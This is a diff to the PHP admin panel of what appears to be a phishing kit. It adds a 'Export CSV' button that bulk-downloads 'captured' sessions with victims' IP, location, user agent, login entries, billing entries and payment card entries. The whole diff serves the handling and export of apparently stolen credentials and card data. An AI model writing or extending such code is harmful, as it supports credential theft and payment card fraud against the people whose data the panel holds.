@@ -17,6 +17,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_session'])) {
 $search = trim($_GET['q'] ?? '');
 $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
 $perPage = 10;
+$export = $_GET['export'] ?? '';
 
 $rawSessions = admin_load_sessions();
 $sessionList = [];
@@ -35,6 +36,63 @@ usort($sessionList, function (array $a, array $b): int {
 
 if ($search !== '') {
     $sessionList = admin_filter_sessions($sessionList, $search);
+}
+
+if ($export === 'csv') {
+    $filename = 'sessions-export-' . date('Ymd-His') . '.csv';
+    header('Content-Type: text/csv; charset=UTF-8');
+    header('Content-Disposition: attachment; filename="' . $filename . '"');
+
+    $output = fopen('php://output', 'w');
+    if ($output !== false) {
+        $headers = [
+            'Session ID',
+            'Created At',
+            'IP',
+            'Country',
+            'City',
+            'User Agent',
+            'Login Entries',
+            'Billing Entries',
+            'Card Entries',
+        ];
+        fputcsv($output, $headers);
+
+        foreach ($sessionList as $session) {
+            $meta = $session['meta'] ?? [];
+            $formatEntries = function (?array $entries): string {
+                if (empty($entries)) {
+                    return '';
+                }
+
+                $formatted = [];
+                foreach ($entries as $entry) {
+                    $encoded = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
+                    if ($encoded === false) {
+                        $encoded = '';
+                    }
+                    $formatted[] = $encoded;
+                }
+
+                return implode("\n", $formatted);
+            };
+
+            fputcsv($output, [
+                $session['id'] ?? '',
+                $meta['created_at'] ?? '',
+                $meta['ip'] ?? '',
+                $meta['country'] ?? '',
+                $meta['city'] ?? '',
+                $meta['user_agent'] ?? '',
+                $formatEntries($session['login'] ?? null),
+                $formatEntries($session['billing'] ?? null),
+                $formatEntries($session['card'] ?? null),
+            ]);
+        }
+
+        fclose($output);
+    }
+    exit;
 }
 
 [$pageSessions, $totalPages, $currentPage, $totalSessions] = admin_paginate_sessions($sessionList, $page, $perPage);
@@ -101,6 +159,12 @@ $flash = admin_flash();
             background-color: #232f3e;
             color: #fff;
             cursor: pointer;
+        }
+        .search-form .export-button {
+            background-color: #2e7d32;
+        }
+        .search-form .export-button:hover {
+            background-color: #256327;
         }
         .card {
             background-color: #fff;
@@ -178,6 +242,7 @@ $flash = admin_flash();
         <form class="search-form" method="get" action="">
             <input type="text" name="q" placeholder="Search captured data" value="<?php echo htmlspecialchars($search, ENT_QUOTES, 'UTF-8'); ?>">
             <button type="submit">Filter</button>
+            <button type="submit" name="export" value="csv" class="export-button">Export CSV</button>
         </form>
 
         <?php if (empty($pageSessions)): ?>
